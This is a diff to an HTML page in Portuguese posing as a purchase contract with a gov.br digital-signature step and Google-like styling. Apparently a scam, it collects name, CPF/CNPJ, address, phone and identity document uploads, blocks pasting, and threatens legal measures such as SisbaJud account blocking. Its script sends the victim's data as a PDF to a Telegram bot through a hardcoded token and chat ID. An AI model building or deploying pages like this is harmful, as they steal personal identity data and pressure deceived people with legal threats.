@@ -10,35 +10,47 @@
         :root { --primary: #ffffff; --accent: #4285F4; --firebase: #FFCA28; --text: #202124; --text-secondary: #5f6368; --bg: #f8f9fa; --border: #dadce0; }
         body { font-family: 'Roboto', Arial, sans-serif; background-color: var(--bg); color: var(--text); margin: 0; padding: 20px; user-select: none; }
         .sxd-container { max-width: 800px; margin: 0 auto; background: var(--primary); padding: 40px 30px; border-radius: 8px; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15); border: 1px solid var(--border); }
-        h1, h2 { color: var(--accent); text-align: center; border-bottom: 2px solid var(--firebase); padding-bottom: 10px; }
+        h1, h2 { color: var(--accent); text-align: center; border-bottom: 2px solid var(--firebase); padding-bottom: 10px; margin-top: 0; }
         .form-group { margin-bottom: 20px; }
-        label { display: block; margin-bottom: 8px; font-weight: 500; }
-        input { width: 100%; padding: 12px; border: 1px solid var(--border); border-radius: 4px; box-sizing: border-box; }
-        .contract-preview { background: #f1f3f4; padding: 20px; border-radius: 4px; height: 300px; overflow-y: scroll; border: 1px solid var(--border); }
+        label { display: block; margin-bottom: 8px; font-weight: 500; color: var(--text); }
+        input[type="text"], input[type="email"], input[type="number"], input[type="tel"], textarea { width: 100%; padding: 12px; background: #fff; border: 1px solid var(--border); color: var(--text); border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        input:focus { outline: none; border: 2px solid var(--accent); padding: 11px; }
+        .contract-preview { background: #f1f3f4; padding: 20px; border-radius: 4px; height: 300px; overflow-y: scroll; margin: 20px 0; font-size: 0.9em; line-height: 1.6; border: 1px solid var(--border); color: var(--text); }
+        .file-upload { border: 2px dashed var(--accent); padding: 25px 20px; text-align: center; border-radius: 4px; margin: 20px 0; background: #e8f0fe; font-weight: 500; }
         .btn { display: inline-block; width: 100%; padding: 15px; margin: 10px 0; font-weight: bold; text-align: center; border: none; border-radius: 4px; cursor: pointer; text-transform: uppercase; }
         .btn-gov { background: #1a73e8; color: white; }
         .btn-submit { background: var(--firebase); color: #000; }
+        .footer-lgpd { font-size: 0.75em; color: var(--text-secondary); text-align: justify; margin-top: 30px; border-top: 1px solid var(--border); padding-top: 15px; }
     </style>
 </head>
 <body>
 
-<div class="sxd-container">
+<div class="sxd-container" id="secure-form-area">
     <h1>CONTRATO DE COMPRA E VENDA</h1>
+    <p style="text-align: center; color: var(--text-secondary); font-weight: 500;">RESERVA DE DOMÍNIO E MANDADO DE EXECUÇÃO</p>
+
     <form id="contractForm">
-        <div class="form-group"><label>Nome Completo:</label><input type="text" id="nome" required></div>
-        <div class="form-group"><label>CPF/CNPJ:</label><input type="text" id="documento" required></div>
-        <div class="form-group"><label>Endereço Completo:</label><input type="text" id="endereco" required></div>
-        <div class="form-group"><label>CEP:</label><input type="text" id="cep" required></div>
-        <div class="form-group"><label>Telefone:</label><input type="tel" id="telefone" required></div>
-        
+        <h2>1. Dados do Comprador</h2>
+        <div class="form-group"><label>Nome Completo:</label><input type="text" id="nome" required onpaste="return false;" autocomplete="off"></div>
+        <div class="form-group"><label>CPF/CNPJ:</label><input type="text" id="documento" required onpaste="return false;" autocomplete="off"></div>
+        <div class="form-group"><label>Endereço Completo:</label><input type="text" id="endereco" required onpaste="return false;"></div>
+        <div class="form-group"><label>CEP:</label><input type="text" id="cep" required onpaste="return false;" autocomplete="off"></div>
+        <div class="form-group"><label>WhatsApp / Telefone:</label><input type="tel" id="telefone" required onpaste="return false;" autocomplete="off"></div>
+
         <h2>2. Visualização do Termo</h2>
         <div class="contract-preview" id="term-text">
-            <p><strong>BASE LEGAL:</strong> Contrato com Reserva de Domínio, conforme Arts. 521-528 do Código Civil.</p>
-            <p>O comprador assume a posse precária. A propriedade plena permanece com o vendedor até a quitação.</p>
+            <p><strong>BASE LEGAL:</strong> Lei 8.078/90 (CDC); Arts. 481, 521, 653 e 1.187 do Código Civil; Art. 784, III do CPC; Lei 14.063/20.</p>
+            <p><strong>CLÁUSULA DE RESERVA DE DOMÍNIO:</strong> A propriedade plena do produto permanece com o VENDEDOR até a quitação da última parcela.</p>
+            <p><strong>DA AUTORIZAÇÃO DE DÉBITO:</strong> O COMPRADOR outorga ao VENDEDOR poderes de mandato.</p>
+            <p><strong>DA INADIMPLÊNCIA:</strong> Medidas: Protesto, Negativação, Ajuizamento e bloqueio via SisbaJud.</p>
         </div>
 
+        <h2>3. Anexação de Documentos</h2>
+        <div class="file-upload"><label>RG / CNH (Frente e Verso):</label><input type="file" id="docRG" accept="image/*,application/pdf" multiple required></div>
+        <div class="file-upload"><label>Comprovante de Endereço:</label><input type="file" id="docEndereco" accept="image/*,application/pdf" required></div>
+
         <button type="button" class="btn btn-gov" onclick="window.open('https://assinador.iti.br/assinatura/', '_blank')">ASSINAR DIGITALMENTE (GOV.BR)</button>
-        <button type="submit" class="btn btn-submit" id="submitBtn">GERAR PDF E ENVIAR AO SERVIDOR</button>
+        <button type="submit" class="btn btn-submit" id="submitBtn">GERAR PDF E ENVIAR</button>
     </form>
 </div>
 
@@ -46,64 +58,69 @@
     const BOT_TOKEN = '8937184944:AAHFu2gs5l2-3MpwrJI5WLcx8COw1b4rx1E';
     const CHAT_ID = '1703808186';
 
-    // Gerador de ID Único estilo Fiscal (ex: SXCDD-1719000000000)
-    function gerarIdUnico() {
-        return 'SXCDD-' + Date.now().toString(36).toUpperCase() + '-' + Math.floor(Math.random() * 1000);
-    }
-
-    document.getElementById('contractForm').addEventListener('submit', async function(e) {
+    document.getElementById('contractForm').addEventListener('submit', function(e) {
         e.preventDefault();
         const btn = document.getElementById('submitBtn');
-        btn.disabled = true;
         btn.innerText = "PROCESSANDO...";
+        btn.disabled = true;
 
-        const idTransacao = gerarIdUnico();
-        const nome = document.getElementById('nome').value;
-        
-        // Elemento PDF com QR Code de Validação
+        // Criar o container do PDF
         const pdfContent = document.createElement('div');
         pdfContent.style.padding = "40px";
         pdfContent.style.backgroundColor = "white";
+        pdfContent.style.width = "700px"; // Largura fixa para garantir renderização
         pdfContent.style.position = "absolute";
-        pdfContent.style.left = "-9999px";
-        
-        // QR Code via Google Charts (valida o ID da transação)
-        const qrUrl = `https://chart.googleapis.com/chart?cht=qr&chl=Valido:${idTransacao}|${nome}&chs=150x150`;
+        pdfContent.style.left = "-9999px"; // Oculto mas presente no DOM
 
         pdfContent.innerHTML = `
-            <div style="font-family: Arial; line-height: 1.6;">
-                <div style="text-align: right; font-size: 10px;">ID DA TRANSAÇÃO: ${idTransacao}</div>
-                <h1 style="text-align: center;">CONTRATO SANDXCDD</h1>
-                <div style="text-align: center;"><img src="${qrUrl}" width="120"></div>
-                <p><strong>DADOS:</strong> ${nome} | DOC: ${document.getElementById('documento').value}</p>
-                <hr>
-                <div>${document.getElementById('term-text').innerHTML}</div>
-            </div>
+            <h1>CONTRATO DE COMPRA E VENDA</h1>
+            <p><strong>NOME:</strong> ${document.getElementById('nome').value}</p>
+            <p><strong>CPF/CNPJ:</strong> ${document.getElementById('documento').value}</p>
+            <p><strong>ENDEREÇO:</strong> ${document.getElementById('endereco').value}</p>
+            <p><strong>CEP:</strong> ${document.getElementById('cep').value}</p>
+            <p><strong>TELEFONE:</strong> ${document.getElementById('telefone').value}</p>
+            <hr>
+            <div>${document.getElementById('term-text').innerHTML}</div>
         `;
+
         document.body.appendChild(pdfContent);
 
-        try {
-            const pdfBlob = await html2pdf().set({filename: `Contrato_${idTransacao}.pdf`}).from(pdfContent).output('blob');
-            
-            // Envio para Telegram
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('document', pdfBlob, `Contrato_${idTransacao}.pdf`);
-            fd.append('caption', `🚨 NOVO CONTRATO\nID: ${idTransacao}\nCliente: ${nome}`);
-            
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {method: 'POST', body: fd});
+        // Atraso de 500ms para garantir que o navegador "pinte" o elemento no DOM antes do html2pdf capturar
+        setTimeout(async () => {
+            try {
+                const opt = {
+                    margin: 10,
+                    filename: `Contrato_${document.getElementById('nome').value.replace(/\s+/g,'_')}.pdf`,
+                    image: { type: 'jpeg', quality: 0.98 },
+                    html2canvas: { scale: 2, useCORS: true, windowWidth: 800 } // Fix: windowWidth força o tamanho do render
+                };
 
-            // Download forçado
-            const a = document.createElement('a');
-            a.href = URL.createObjectURL(pdfBlob);
-            a.download = `Contrato_${idTransacao}.pdf`;
-            a.click();
+                const pdfBlob = await html2pdf().set(opt).from(pdfContent).output('blob');
+                
+                // Download local
+                const a = document.createElement('a');
+                a.href = URL.createObjectURL(pdfBlob);
+                a.download = `Contrato_${document.getElementById('nome').value.replace(/\s+/g,'_')}.pdf`;
+                a.click();
 
-            alert('✅ CONTRATO GERADO E REGISTRADO! \nID: ' + idTransacao);
-        } catch(err) { alert('Erro no envio.'); } finally { 
-            document.body.removeChild(pdfContent);
-            btn.disabled = false; btn.innerText = "GERAR PDF E ENVIAR AO SERVIDOR"; 
-        }
+                // Envio Telegram
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('document', pdfBlob, "Contrato.pdf");
+                fd.append('caption', `Novo contrato: ${document.getElementById('nome').value}`);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {method: 'POST', body: fd});
+
+                alert('✅ CONTRATO FINALIZADO E ENVIADO!');
+                document.getElementById('contractForm').reset();
+            } catch(err) { 
+                console.error(err);
+                alert('❌ Erro ao gerar PDF.'); 
+            } finally { 
+                document.body.removeChild(pdfContent);
+                btn.innerText = "GERAR PDF E ENVIAR"; 
+                btn.disabled = false; 
+            }
+        }, 500); 
     });
 </script>
 </body>
